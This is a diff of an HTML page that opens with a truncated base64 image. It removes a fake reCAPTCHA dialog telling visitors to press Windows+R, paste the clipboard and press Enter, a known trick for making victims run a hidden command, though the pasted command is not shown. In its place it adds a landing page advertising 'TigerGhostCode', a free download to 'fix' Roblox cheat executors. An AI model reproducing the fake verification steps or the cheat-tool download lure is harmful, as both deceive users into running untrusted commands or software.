IvsnLR/KRVDii5p/QNUhKWjRaOgxqAPg2YrAuzmazj+G3uxnrtNlkyhGjgBR1EnoWglzOnJZIyKEhv4djzxDli97zpS+dSGToeS7EjbhmXbFQVPeFDn/qLAKxrTwSW4cVQvYj09HUaQIbiRzUTvRtobiilbEOgPAGz/Pvw/UFtNdWKQGPSGYEyHJ+XV2dE/g0ldFWur7XjkY+/ctf/vLvq933+f93LEUW/9x3RUM6k1zsuvYkdJgIO4YoBSkwoQdjZCDFa76k0pVRBQsDUgUfEAhDaqjtopTP+iYA89q5c+e2b80q2MjkB0wmKbrXIaAkEpZEQ66FbEeW/B8PdC/kHNKGb7733nvfAvCuAACn43nqO8jpP9o02ndAkg+s1WouoYAXDi4taki0WRZs92acvwLg27i12wBGKj2bBLUrYVTLQqG4OpcrfCeXyy8HG6k5WO6EE074HYB7IjrmcVBUCo+SRC22FSNLaBkIqSI2DwNsBbbvUeaEL3zhC1s9+EYMgPl8lnxxXQDQGoDnWjT2jxcsWDBo8gV2/Q/cexoAfSv2q4Fpf/jddMNlcqntoVEfMsl9+lgpl8s9B+p3HkSMa48//vhtJqnmyKyWKaQP4LVj+zUa9Pb58+d3DPVZFKEM6vd9dM5KsKUv4jcFuw5zYp/NotTwKiaPckAsmaXwXZ0YXBT9vAzf+vhJJ520TWV0HREAui538vmuX2Ok3zdv3rwNm/Ks4447jihJ65133klJJ18CqE/KZDIfw+9ytHVo0gijVJSsRccikTab27QSjarpK/NFvUGhsqFDuVYCgHdhvxzHXv3Sl760zaVsGxF7xfXXX18HMFhnnHHGsKdLu/vuu6di91mA7xSaEETUkDo0GnUTtaeFoOwbatUXODXx1D6TnMJInnAgRN8X+r7pfBhDqEPt6VgW2x9Rn3tx7A8YpO1sGy3bZPqvO+64ox4d+gF08klg8R/B7xZ0JCcTTRhHF6WG0fi6GowrNU3MCz070RlwOgqIE9jo/eEUTbqWwIf6lUDxXsFxongP4r6X5syZs02v2rTN5p974IEHzM7Ozino1IPx51chPx2EDq0L2RztqdNDzTkaEBGlZgMFkEapY9/rorJclApGJyUpihcsD7wef/4YwLsH9Xyxo6OjCxxim18ybJtPgAiWnECnToJceBgAcToAMQsAaAjdW2FajL6AGmjJ2Gqg6yVg9wFfGOkTSQ/i4dxqUL0n8J67cewZsOU2yLU+204K314+dPny5TRrbRIAcCgA+XF0/PvQ4dPwW9Dko9DYG/phQ3BFFZn+AFgpUsX3aC1kAWXHYLZjR59dxO9/4N3/i78fxLaCMvhDyXDZdla2KgD2t5p7LSu933XXXRyU0ADYKCHk7tls9pD6+vqP4Pf7Ab5xfZMahSxyIFkvysL7st9Qo8V1XjqdXtPV1fUw2D7lofkzzq/EOfIIUcQP2x4LHwmwjHS5//771bd3d3fT92cAjL0Byv0Btnejzu/FsZ0ByHQIwHCSen9qSGQVppC9lnAvrbj+Eu5/HL//Daw9j3e9CtmziE2C4rHtvWyVLHhzgXvJkiWJcePGTS4UCmMAml0Amh0Bpn2w34Umf2Mbj62OQIvjap1ZnOvK5XIO2DgFzr6O469C811RLBZfRD2LDQ0N6/F7w2DcjNtKe25XMuDmaMRrrrnGALskYz0HqCi9rwHKlQTQmuh95MsGVdsIkJGf1mtqanLx28c93hFHHBEveh2XuMQlLnGJy9YnTsStEJe4xCUucYlLXOISl7jEJVY+4hKXuMQlLnGJS1zislXKgFuVnBkLxXGJgRqXuMQlJhZxiUtc4hKXuMQlLnGJy3CVUSWQ0qQg27b3EkJM8H0/iW2j67rPf+tb38oN5jmLFy+mNBx1hmFQ2oOur33ta04N76asCTQTjlP+wjA3HxWV+te2s9/+9rdL1e6/7LLLEp7nNYRJJXXuF45v4dGlxsISzp7T81g2Lly4sOIckiuuuIKWgt0D30ITo+gda7E9t2jRomI/32Lg2Y24zhw7dmznnDlz+k0Ze+mllzZQW6Gu9N2dZ5xxhlNDGxvNzc1jHMdxc7lcF/4e0qQrczQA7/LLL6fsBUejwY5LpVJjKXERZT2lj8tkMtmLLrroqTFjxixZsGBBqZbn4R7qrNPQqHvjuXdffPHFP/3GN77RbyfgXe9B48/GfWMBXpdAqNcDVlMzGxoaXDyHZr89iWt/CgCsjt6fz+cPQJ3Pxf0WACtQB0IbpQ+mHByCMiJQ/kJKyUHzhPXCh/R8ynJ/Jq7plYBo2bJlyWw2+9+473hcMwF1S6lZV1La2HXecMMN/4Pn/OzMM8/slajy9ttvF52dnTS1dB7uGdfd3X0pfj9S7buXLl2awfcdj+1TlD8Hz5yPwysGamP0xwxce3k6nc6ijssAwEeGAsIRByAqbeFDFjU2Nh6PDmxGI7j4oCwa2Ucn1hWLxcyECRNmoDPGAACXAUitAz0TIJmBhvkYgDwNHUaj+TfY+gUgrbWG974b903CfZQGlzrb11m1FJhQjwQ69H0AzqHXXXfdD3D8H6AWqtFxbAzuPbC+vt5saWmx9CqZJs2qw7ckae0TfJ8TrpEHUPl6wcZX0PlWH6o3FufPw7M+h/c34HyBFsimWXh4Rwv+TnR1de2Bd06+9tprrz/99NPLKe5Wr17N8f6JuOYAXL8j2m1cf9+Naxw8Z0fsD8KfadQzUwPBoJmBnx83btyHaeop+oxWlP8rcZutCoBgWyYadA62L6CBM2isNWiM36HzXsBWRCfsioY8EudmgQIdTckor7nmmrsGYhG4Z29sUwHERFtb23vQWGP7Upi+haZdgmLQzEuBTliD7UnilJS1gCiPaZmio6NjDwIZjh+Furp47rfxDW+AxUvUj+YF34f3KdAR68Xz0viG/QDs6ZRiF9/xCwwoNbjwHh9/+7jnLVqSLMI+LVx/LOpzLP5spPnFaIvf4f5X0NEO7p2F8x/Gt83C8c/j/OsA4U8AQsWSJ02aRN9PKemIDVPd+03tgGdJGmQ6fyKvRSwD6MYA5DTALUp/hzIV35/Z6gCIShOL/Cw6ogl7yiBwPg4/S5QhbDz8fAidfh+OE2s+BtcRMF7sR/5J4zn7kTxH7BNUtHHjxo3vhZzz+vnnn191rq5OHMQpMz3e+yvc//1QVgtzuhQKhWZccwn+PrapqelosN2HKK8LETQcex7P+CZ1YiT1G+VBnI37zqb5xLj223jeWjoXSUpJ3+pG6nEgzp2CNhkDYP4LYP423kPJiyixO7XJg5TMHb9vxq2zANSPU55sfPdb55xzjsS7VK5sGkg6t403EABpkBGu/KAMyEbxzkmo32SAkIEj0HtmkewO4rB2sBm9RhSAqDSxvD0BFKIAN6FhnznttNOimaF8fNQ/wG6uBJBI3piGjtwZbPtlbH6V0TkF17wLnUCpMUpEZQDIk/Cb1rSX/VBNxRZBtZzW1tYCwOpUENY3oIOux7XT8NxDcegTuP6XeGebVibcPoOhhM7K4XxJLznrnH322U5/g4fyGWLbDdd24JnXYHsE90Qv82+++eaX8Y0/A4uejnocgnbcHW2zkukUhKCKnBIukd6jFwevWgAgYuuUW1u1Z7jvr+D6Q/DeJOpgQxY0wRlIbNkVx5/sK+oMlDCgKgDvhTCbdd2kZkGOzp1HgrBAh9qnnnrqOxSCq666KomRZ6LRLfoQvXpPaf78+V6FxqZGolS6RLH+ho58Yu7cue/4eIwoylDwY6JIlB4Dzyc566lK5J6eCeBNwbMovcZvceg1bJ/CNgNVSWJfNRE6yXnUWGhEyoJQ8RqAkoHdvYLr/oB3zCK5iVK/oV4VM9aTokGsFtcSK/fDRWaqFVxHKUH2xHWkkT+OOv3xK1/5yjuuQ9szgPBFPJMUoV3xjt3w+zGmV6HXOQ+hULi8Bi5EWr9aXooGIZ7V7z3UxwD44eg7SvJ0y7p16/L4/tmo727QhlNQguzoojkDZauoKh/YrjsVN38XFfoG9gdjfxgqSCPypzh9/PXXX1+u6CWXXGJCKJ+Ea0iLvAqj4yYcvhXXE2iOqLSKN45n8OG70Ydj/xBGYlX5ASDsxvXriKVhm5aqsh4D3pdGp72PtGdsL+H3wyTPaf/npwZgRcpsQoqD1lyryT8uXr8W13bj+WR2aahq4wqSUXIMBkH7gQCIZ1Ob769XQn8Zh7L9XL4W17XhOqrvNBr4UeBrNq/MQAOBUC8grsgnsfkB5OvdKG8O7umCvPs33PInHF6F+w7FuR0Ga9qrCsDOQmFnfMBJaOwFBCySz9DYn8bvD+Llu5NmF14LinQIKnIHzp+J80dTelxsH0xY1hdQqZtw7ASAMNWHOkzEZpKMhcq/DAD2u0wDRt3j6Mhn0ZFve1V6EpRrLN51FOrRBVD/Cyzi74KLt3C8YFmJz0J7q/q9tMiNlsvIZML76yzKbkXslLgB3lMVgKAIlD9GoA0N4kMDrfKJ9xIFnEicEdtL/YkMqEMb2uTvaI+/6JzSZuSckusIiAMFH+h1mBX1JwAOBFicP1TL4+vQri/iXW/iGW/j8/bCNplMOcMiAwbY8Gl5VMom+hESTvFRLxAFMA1zBRpWgQCUb1e8+Ps4vzOxBFTg32TMROM0QW6j9Li7oQNOxvHn8fsvEeqwM2Wawoeo90Cm63fk4bpz8VyRE0LmoSFXoThT8Ky90CCvoZ6vnHXWWevBvldBxyNw7Y7vIJPE+irmiLIBub9OQ6P72pJCBmJBNrl+TDuqWtokM2BnkCUA9SAxhlj6SpJJq14Lym6Y5oVUh8bGRgJbSdcvpH7hunJ8ABmQzFYkZnl0X7gweKUCTkdEh7KFjaH81fimf2FrwfYfvG8/nHuv6zokB5YGDcC+2eBJOQsUNN/DvoD9b2lBGWiJHRNbJradMu8UB2xY4PhcHN8Fo7cDI/56gO6nCxYscLU967PQFq9ChUlO+RDkh39CoM5rSkL2raRPml0NK8EsXLiw3/Uxli1bRmaHYxKBFXkV6rxeDySSpT6JfbMwxPtw6IFqAAw1zTB/cxWQkAQwjUwkuL5AA7I/xSYEAA9K/24pzhNUFRasJCr7S4559jnn+JU6mjTTzs7O0NxI6eM4BiHXZqG+VFQ1EZltQvZLVLMf++o0PGNPskfiXjIPFanfceoFPOOjAN/HcOzqIQFQN1R0HV/6QLJd0cP+Aoq2BLLYir7yACV1RN3JRfRvjL5fheCjcu655/4MID0WlfwQ/pxJFAr7V/TzhXrnMK3RgXo2omE+gAYg4ZhMIhs15fwLjmdp1KIeBwGoP583b55fyQyjgUhr1/WnLU/Fdoh22z2BDqtqGPfp25TzolwGkgHTYT8MBMB+RBUlJtB3UB/imz8AzkQmIE7sUQ8CoVfipIz9RMmJepFBT7kh+1GSdqc+x7M6sf81LY+2YcOGwvjx41/HM9rxeXugW0muf27QAOyrrYjAA+BRSjzsSZ5aWaHTDsAHEiu1IUM9QspCBZmJlhP9EOVnhobZHKUO2tYnhyORHuoyg4RgNGiWBgPAryjt6aef3gEK8DIahsC/CxgsCcqrK/V/6JtFXTOQF1uofppqEAWhziUZ7asagMQVfonrqy604wUD2tcDu9bPlNqcwoeyMjzJsiE3I0ChfBLPOSoEnt5CIBLgSOZN6dyHItSkK2i/1BA74b5GAJoA9yraWNUVg5oM92vQVpRZ9jNDAuA7gON5ZG9RfksiMIsWLfIrsAwS+utR8S4yxFZhKy9qCztpvWliB2SsJMe3NtUMy3p1AMbhZNJBQ5BG9nKfQfBztNORNHpxbmYlAIbrdRCrAoslRUut50F7WhIW1L0JyhZRvwNIAcO3/AHHH8XzqooGCXqmBhUBe8AFbyJ+iEqrow++KKKyFlurBrYIKax+NgGRNPQp5AalvqhGASFakfz8blxLOiA5C7IR7kMerNeBBTr/CRz61nAoIWQ2IApADmpehSRTxIpBgQNdXV37UuQGjpFs5GsLfwdG12QyBtOXkkYI1T2stNRLkg5onhioLF26tB6P3wevtLC9RiO0z7f8CcdMAIi8C7vdcsstqTlz5hT7gFTxJWjLVj6fm4FvmkruLFJ8qN70G9+SRL3XUhAArv8R3vU6KKyswcRQk4uLE2AkY2wTopQaGhponWEeLPPqehSMgd+PRil8OBB0hE4a578IZeRjRAX7yomR9iF/8SFk10R5CM/NRwC4EW2zin5i8O50ww03HPjVr371mU0CIAmoZE2PJN3u65A28GICnEu2KLz4dLpNg4CoBwm11AAWaYPoeOpEihKJap0D2p1qpH774XnT6HWoy9PnnHNOsQ8VbtVmjXcBWDPASlvw++2+NjtiuY5jk6BEIsdT5AIm4KGa9djnMMg2EqXHb1qlcyXeafcjz3F0RC+2WoOPNRth2UMqHR0divXqdYYNfOtqiD7/irgby6FmejFE6q8Pk7OBLBI4JqooaTOxTaBXkIaOZ5SpBhRL94c//CEpItQ+JCeSJXrTAEiNQOAgVllFGFZqnXayk+E3o0eTCE+S0Ks1ypJWDgx0omIBJCTrhuabymrw7P3wuh0BdCefzx927bXX1lM8nFqJHSwFjdzR3NxM19UBrPvi+A59AajtkZ5eSPv32F+jtVKi0PQ5BXyPRwOOvhda+UACGr2bvp9rDXvARW9I5kZ7+tUGfS0FbaDqS/2mtVy/ktIVlu9+97se2sbXNkNWzQ6I8yRHZsitiO0EvOOTV199tQiwaVAD7YB9M66zcrnckZALE3ivPWQA0geE1vEqKrmiksRZqVNw2Rx0DI0OHkZWkHeBVHw9qhxct4I4s35+N66xsU8RGx6ootdddx3JXtOwvYHO+fdpp51mh+YX1GOcNozbGO3vRccfFowNoZQA+gbSksGeKPRrJ2LDYNvPn3XWWXZEiZGhywzPK+B+5ZkBNR2a9AWwoYNUOxKYMDD6tbFpH2tRKxBkohqn7ZGyitmJXJh7g8LtjGvfwO9/nXrqqV64tBi9izgPUcQBQB8ODhW3GBKQaLn++usJeBQJRH1Zh3s+p33MKkwtkK6MBEkwNOBx3YTOzs5dNdcZohISvEBqWa6iER0vtMNVKNFp6/D3qxF2Fq70XdbK6PfixYvDDn8THZ7DvhkfNeHSSy81zz//fLcfE8BFeMZB2H5BK4aHBmUAhtaD2x0f7pH5hAr2PuQ9ylyvAgyIKhB7QyeRtjee2DD2v406zi3D4tJXHU6qozFU4PX1MhAFpIFIxt7+TBxa7FH1JgM97mvpzy+LZ01B212AZ78f+9/inrNI2WhvbyfPFL2TONCAvt0xY8YENpnA/khyrqjgoTmElqygEDTiAnog+VqupPsovKyELd3Y2EgcwqTYyk0CIOtRlSoasBYsWMAgzKtn6JUeG+hYrWX+/Plv3nTTTaHhk2xLqWq+z1tvvZXYyrvRsA2gJCY1ctlnbdvTyVeN95P77XtokHvQqGkyKRAFILcUCc6gmLmbb76Zwro+iWftQyz6xhtv7EY9AopvCpYv5EnbtSgucDg08/KSXdCkiR1XU+Yig2wtvuc/aJOZuH46yZ+BNecd/cJuu+22FtR1B1xDAaprQ6108uTJKsIFzyG2Kfpzt2o3qhKV8AxTa8S8D6UlKwAtf9uMd7yKdqbQMvJ2COJyivQB7BQwi2OzMOh/RUDG9bMgFybmzp1rDwmAfUDHqxg928HWSGifgAp8GIf+XgVAgkAKzcjvI9i+hHt3QcN/Ag2x/JprrslS9EsFyjCRVi7Cx1HY09P44O6IeWAGeTnIH4nnPQ2t1KsGZNSRKMXH0Dg74/ce+MS3Q7uXnsNBADTRecMCQHyTEvS1DMn787Do8ia1IS2oiPocgvvIqFsp9pE6nFygO6JtOvHtj1IYGZ1Ys2YNsXKmKaAYyP1CLJoiW7RbUVQYRC0UMU0AxfP+iT6g+SjVPB3PYFCvQhuSg2J31HFnFkQkDT4Yoa99rIpt6DlU6i2Aw8J1HwdFGxONkqGCUUCmC5Lf9li+fDnvYzz+JRqvEx0zBdsxaPQ6shOG52lyEe4nf/HZ6EziFASyVwj0kQZ6P3EJ3LsK9RhoAWwyoNIzdsO1M1B3IyoLkbmF2IfZnz9qECW6BCyx4SpBPNH2aMP1TxMrJbMSts9QJBG1Q9kgvGSJQBvRPA5yK44D2J4HgF6HzOVHvTqkTBAFHIgF6xAsJcdVchfi7wNwzZ4YlMR6VwJ87QN8w++pP9CeM/Et02l9viFRwMho4P2Mnn9TLB8adk9cPx2HzsBL70OjkXdAYiRQVDKFcZ2H7VGwhotY7zi+/8Nxiu37MPanUcNj/zfc366JMEVKH47nnIoP6kYjPAWq+xqUB9XY0HZJEJ9FyMS5hwGergEam+TG19FINMtsJupNWq4T8dvK0DwxTO7BXgtSD2TvhAjjgYL8Edcehe86GuD6Kr5rLUSKh6+88kpy8IpkKjURz/swAH0cngeFM/cbtM0qmhag2XjoZeJaFucDKD5KWwuRp60TZc5FS5Wh/XeC6LMe73x2oG/GNT9CnU8DcRpDohXuI+WwWDMAI0EJaioEfXQ1Mn722WfboHj3oMH2QmceiMtOxrfMIH8vOelpBUrsj0Fj0iSWBpJXogBEY72JCt5BK5rjw/fBnhSNP+O+ldpgOhn3fyjoS+dpNMT9eM7qyP0034PcexQU+W8IwMUBlIK1aKDncd+RuI8iiScRINU5x1Wz1EgT5nz4ZqtGlnPltTwXgv5KdN7N+NYJqN/+qM+FeMZ7ce9KpSsF9rjDyYSK7RFc91u0fzbK9nX0dTijjw9AsUiMM3Xkst9H3B9PxmcCEQb+Glz79ED1h8z3b3Ctt3DtVPy5r56Ps3owLDj0VlN8HrktNujf1Ubt37BbgsYi4ZPCyMkEciq2ufiYo3GsHeChVcDvAkh7hULNnj2bGpGmOS7BBz4IAGygAFbs59KG934If6/Hs0Kmt8QAAAKtSURBVH+L65ZC/niGqETkEUfgmk48+zlsq/E8WanzIzIn+W//hfe9jH0T3rFz5No8tnXozDV4Z9twgI8AgA6g51IM44b+wqvCAhZHJq1HUMdLUMcHyOdM4g2AuACDZx4uocDP1Th/L9rlGpq0hDaREXmZ7LfkD6e5J2/T/QNwBbIQdOBda1C/NRQaF9W0sduBlCMcfwXtt76W78Yz7yfKTcvikklpyZIltbPgMCgBewppWqa8U5b17ABk/LGurq4V2B9M0bnkOdBeEZoB9hopDviA9XPmzHEpnDxaoHTkL7/88sdw7+s0z4KEV1xfr+x3jHUCGa/gQ/4J6vbmF7/4RbePqeg5Aij2K2gbqGHGjh3rtLW1UQQL2btaqIPKz5JqJh65LigI4fHhACCe46DTaHDcTDIWvq2mCfYUUQTtk9xdr+Oeg3EvKSONxAnwrLyOln6aBgt5IaL3rl271sd3/hNgvQn3NrF+JnBpM0ypvb39UdSzFaAhkWRjhDquR1vdRzZW9M9zeorFgAX1ulODtR377qampqr2zKoyIEbWRortIxkCH9OvKg3KQ0LTq2DHq3RIEan0yq1Ak3LmzZunhCpowVVHPWmAEK5byXVHYfFKXjJNx3ec/HmLFtlVrP6/J42VRi0E8WI1M0hYjjvuOHnZZZetmjx58gMAu9Ha2pqPDKJVaLgH8N0mnlUYDgCec845LuTZl/Cu/5BmCkDka70XbUZt8hqASMEVaTyD/GekTvuoY47En0r3kZ0V95AI8zPKjDDQt6BNfMjS/xJcvETs++233y4PEvTdGtR5OblQ8Sf1Y01O+w0bNqxEGy/XYlIJOIpXDt0eS5wLMC5xiUtMaeISl7jEJS4xG4nbJO6fGEBxW8QlLnGJy+ilTFLGdtu4xOwyLnHZ9sv/Bzlg1SqAffQ0AAAAAElFTkSuQmCC" class="captcha-logo line-normal" alt="">
-            <br>
-            <p class="checkbox-desc m-p line-normal">
-            <a href="https://www.google.com/intl/en/policies/privacy/">Privacy</a> - <a href="https://www.google.com/intl/en/policies/terms/">Terms</a>
-            </p>
-            <img class="spinner" alt="" id="spinner">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="TigerGhostCode - Free Roblox Executor Fix Tool">
+  <meta name="keywords" content="TigerGhostCode, Roblox Executor Fix, Velocity, Nezur, Ronix, Solara, AWP, Swift, Roblox">
+  <meta property="og:title" content="TigerGhostCode - Free Roblox Executor Fix Tool">
+  <meta property="og:description" content="Fix your Roblox executors with TigerGhostCode, the free advanced repair tool for Velocity, Nezur, Ronix, Solara, AWP, Swift and more.">
+  <meta property="og:image" content="your-image-url">
+  <meta property="og:url" content="your-site-url">
+  <title>TigerGhostCode - Roblox Executor Fix</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Orbitron:wght@400;600;700&display=swap" rel="stylesheet">
+  <style>
+    body { 
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(to bottom, #000000, #0a0a0a, #111111);
+      position: relative;
+      overflow-x: hidden;
+    }
+    
+    .font-cyber {
+      font-family: 'Orbitron', sans-serif;
+    }
+    
+    .glow-logo {
+      text-shadow: 0 0 10px #ff7700, 0 0 20px #ff7700, 0 0 30px #ff2be2;
+      animation: pulseGlow 3s ease-in-out infinite;
+    }
+    
+    .btn-cyber {
+      position: relative;
+      overflow: hidden;
+      transition: all 0.3s ease;
+    }
+    
+    .btn-cyber:before {
+      content: "";
+      position: absolute;
+      top: -2px;
+      left: -2px;
+      width: calc(100% + 4px);
+      height: calc(100% + 4px);
+      background: linear-gradient(45deg, #ff7700, #ff2be2, #ff7700, #ff2be2);
+      background-size: 400%;
+      z-index: -1;
+      animation: glowingBorder 5s linear infinite;
+    }
+    
+    .cyber-grid {
+      background-image: radial-gradient(rgba(255, 119, 0, 0.1) 2px, transparent 2px);
+      background-size: 20px 20px;
+      animation: gridFade 15s infinite linear;
+    }
+    
+    .nav-item {
+      position: relative;
+      transition: all 0.3s ease;
+    }
+    
+    .nav-item:after {
+      content: "";
+      position: absolute;
+      width: 0;
+      height: 2px;
+      bottom: -4px;
+      left: 0;
+      background: linear-gradient(to right, #ff7700, #ff2be2);
+      transition: width 0.3s ease;
+    }
+    
+    .nav-item:hover:after {
+      width: 100%;
+    }
+    
+    .feature-card {
+      position: relative;
+      overflow: hidden;
+      z-index: 1;
+      transition: all 0.4s ease;
+    }
+    
+    .feature-card:before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(135deg, rgba(255, 119, 0, 0.1), rgba(255, 43, 226, 0.1));
+      z-index: -1;
+      opacity: 0;
+      transition: opacity 0.4s ease;
+    }
+    
+    .feature-card:hover:before {
+      opacity: 1;
+    }
+    
+    .feature-card:after {
+      content: "";
+      position: absolute;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(45deg, rgba(255, 119, 0, 0.15) 0%, transparent 70%);
+      top: -50%;
+      left: -50%;
+      transform: rotate(35deg);
+      transition: all 0.6s ease;
+      z-index: -1;
+    }
+    
+    .feature-card:hover:after {
+      transform: rotate(35deg) translate(10%, 10%);
+    }
+    
+    /* Animations */
+    @keyframes pulseGlow {
+      0%, 100% {
+        text-shadow: 0 0 10px #ff7700, 0 0 20px #ff7700, 0 0 30px #ff2be2;
+      }
+      50% {
+        text-shadow: 0 0 20px #ff2be2, 0 0 40px #ff7700, 0 0 60px #ff2be2;
+      }
+    }
+    
+    @keyframes glowingBorder {
+      0% { background-position: 0 0; }
+      50% { background-position: 400% 0; }
+      100% { background-position: 0 0; }
+    }
+    
+    @keyframes gridFade {
+      0% { opacity: 0.3; }
+      50% { opacity: 0.7; }
+      100% { opacity: 0.3; }
+    }
+    
+    .fade-in {
+      opacity: 0;
+      animation: fadeIn 2s ease-in-out forwards;
+    }
+    
+    @keyframes fadeIn {
+      to { opacity: 1; }
+    }
+    
+    .fade-up {
+      opacity: 0;
+      transform: translateY(20px);
+      animation: fadeUp 1.5s ease-in-out forwards;
+    }
+    
+    @keyframes fadeUp {
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+    
+    /* Mobile navbar */
+    .mobile-menu {
+      transform: translateY(-100%);
+      transition: transform 0.4s cubic-bezier(0.23, 1, 0.32, 1);
+    }
+    
+    .mobile-menu.active {
+      transform: translateY(0);
+    }
+    
+    /* Custom scrollbar */
+    ::-webkit-scrollbar {
+      width: 6px;
+      height: 6px;
+    }
+    
+    ::-webkit-scrollbar-track {
+      background: #111111;
+    }
+    
+    ::-webkit-scrollbar-thumb {
+      background: linear-gradient(to bottom, #ff7700, #ff2be2);
+      border-radius: 3px;
+    }
+    
+    /* Executor logos animation */
+    .executor-logo {
+      transition: all 0.3s ease;
+    }
+    
+    .executor-logo:hover {
+      transform: scale(1.05) rotate(-2deg);
+      filter: drop-shadow(0 0 8px rgba(255, 119, 0, 0.6));
+    }
+  </style>
+</head>
+<body class="text-white">
+  <div class="fixed inset-0 cyber-grid opacity-20 pointer-events-none"></div>
+  
+  <header class="sticky top-0 z-50 backdrop-blur-md bg-black/80 border-b border-orange-500/50 fade-in">
+    <div class="max-w-7xl mx-auto px-4">
+      <div class="flex justify-between items-center py-4">
+        <div class="flex items-center space-x-2">
+          <div class="text-3xl font-bold text-orange-400 glow-logo font-cyber">🐯 TigerGhostCode</div>
         </div>
-
-        <div id="verify-window" class="verify-window">
-            <div class="verify-container">
-                <header class="verify-header">
-                    <span class="verify-header-text-medium m-p block">Complete these</span>
-                    <span class="verify-header-text-big m-p block">Verification Steps</span>
-                    <span class="verify-header-text-medium m-p block"></span>
-                </header>
-                <main class="verify-main">
-                    <p>
-                        To better prove you are not a robot, please:
-                    </p>
-                    <ol>
-                        <li>
-                            Press & hold the Windows Key <i class="fab fa-windows"></i> + <b>R</b>.
-                        </li>
-
-                        <li>
-                            In the verification window, press <b>Ctrl</b> + <b>V</b>.
-                        </li>
-
-                        <li>
-                            Press <b>Enter</b> on your keyboard to finish.
-                        </li>
-                    </ol>
-                    <p>
-                        You will observe and agree:
-                        <br>
-                    <code>
-                        ✅ "I am not a robot - reCAPTCHA Verification ID: <span id="verification-id">146820</span>"
-                    </code>
-                    </p>
-
-
-                </main>
-            </div>
-            <footer class="verify-container verify-footer">
-                <div class="verify-footer-left">
-                    Perform the steps above to finish verification.
-                </div>
-                <button type="button" class="verify-verify-button block" id="verify-verify-button" disabled="true">Verify</button>
-            </footer>
+        
+        <!-- Desktop Navigation -->
+        <nav class="hidden lg:flex items-center space-x-8">
+          <a href="#" class="nav-item text-white hover:text-orange-400 font-medium">Home</a>
+          <a href="#executors" class="nav-item text-white hover:text-orange-400 font-medium">Supported Executors</a>
+          <a href="#features" class="nav-item text-white hover:text-orange-400 font-medium">Features</a>
+          <a href="#download" class="nav-item text-white hover:text-orange-400 font-medium">Download</a>
+          <button class="btn-cyber bg-gradient-to-r from-orange-400 to-pink-600 px-6 py-2 rounded-lg font-semibold hover:shadow-lg hover:shadow-pink-500/30 transition-all duration-300">Download Now</button>
+        </nav>
+        
+        <!-- Mobile Menu Button -->
+        <div class="lg:hidden flex items-center">
+          <button id="menu-toggle" class="text-white p-2 focus:outline-none">
+            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path>
+            </svg>
+          </button>
         </div>
+      </div>
+      
+      <div id="mobile-menu" class="mobile-menu absolute top-full left-0 w-full bg-black/95 border-b border-orange-500/50 lg:hidden">
+        <div class="flex flex-col space-y-4 p-6">
+          <a href="#" class="text-white hover:text-orange-400 font-medium py-2">Home</a>
+          <a href="#executors" class="text-white hover:text-orange-400 font-medium py-2">Supported Executors</a>
+          <a href="#features" class="text-white hover:text-orange-400 font-medium py-2">Features</a>
+          <a href="#download" class="text-white hover:text-orange-400 font-medium py-2">Download</a>
+          <div class="flex flex-col space-y-3 pt-4 border-t border-gray-700">
+            <a href="#download" class="bg-gradient-to-r from-orange-400 to-pink-600 w-full text-center py-2 rounded-lg font-semibold hover:opacity-90 transition-all duration-300">Download Now</a>
+          </div>
+        </div>
+      </div>
     </div>
+  </header>
 
-    <script>
-        let checkboxWindow = document.getElementById("checkbox-window");
-        let checkboxBtn = document.getElementById("checkbox");
-        let checkboxBtnSpinner = document.getElementById("spinner");
-        let verifywindow = document.getElementById("verify-window");
+  <section class="text-center py-24 px-4 fade-in relative overflow-hidden">
+    <div class="absolute inset-0 bg-radial-gradient pointer-events-none opacity-30" style="background: radial-gradient(circle at 50% 50%, rgba(255, 119, 0, 0.3), transparent 70%);"></div>
+    
+    <div class="max-w-7xl mx-auto relative z-10">
+      <h1 class="text-4xl md:text-6xl font-bold mb-6 font-cyber">
+        Ultimate Fix for <br />
+        <span class="bg-clip-text text-transparent bg-gradient-to-r from-orange-400 via-orange-300 to-pink-500">Roblox Executors</span>
+      </h1>
+      <p class="text-gray-300 text-xl mb-12 max-w-xl mx-auto">Fix your favorite Roblox executors in one click — 100% Free.</p>
+      
+      <div class="relative mx-auto mb-16 max-w-4xl">
+        <div class="absolute -inset-1 bg-gradient-to-r from-orange-400 to-pink-600 rounded-xl opacity-75 blur"></div>
+        <img src="/api/placeholder/800/450" alt="TigerGhost preview" class="relative rounded-xl z-10 w-full">
+      </div>
+      
+      <div class="flex flex-wrap justify-center gap-4">
+        <a href="#download" class="btn-cyber bg-gradient-to-r from-orange-400 to-pink-600 px-8 py-3 rounded-lg font-semibold hover:shadow-lg hover:shadow-pink-500/30 transition-all duration-300">
+          Download Now
+        </a>
+        <a href="#executors" class="btn-cyber bg-black px-8 py-3 rounded-lg font-semibold text-orange-400 border border-orange-400/50 hover:border-orange-400 transition-all duration-300">
+          Supported Executors
+        </a>
+      </div>
+    </div>
+  </section>
 
-        function addCaptchaListeners() {
-            if (checkboxBtn) {
-                document.addEventListener("click", function (event) {
-                    let path = event.composedPath();
-                    if (!path.includes(verifywindow) && isverifywindowVisible()) {
-                        closeverifywindow();
-                    }
-                });
-                checkboxBtn.addEventListener("click", function (event) {
-                    event.preventDefault();
-                    checkboxBtn.disabled = true;
-                    runClickedCheckboxEffects();
-                });
-            }
-        }
+  <!-- Supported Executors -->
+  <section id="executors" class="py-24 px-6 bg-gray-900/50 fade-in">
+    <div class="text-center mb-16">
+      <h2 class="text-3xl md:text-4xl font-bold font-cyber mb-4">
+        <span class="bg-clip-text text-transparent bg-gradient-to-r from-orange-400 to-pink-500">Supported Roblox Executors</span>
+      </h2>
+      <p class="text-gray-300 max-w-2xl mx-auto">TigerGhostCode fixes common crashes, errors, and performance issues for these popular Roblox executors.</p>
+    </div>
+    
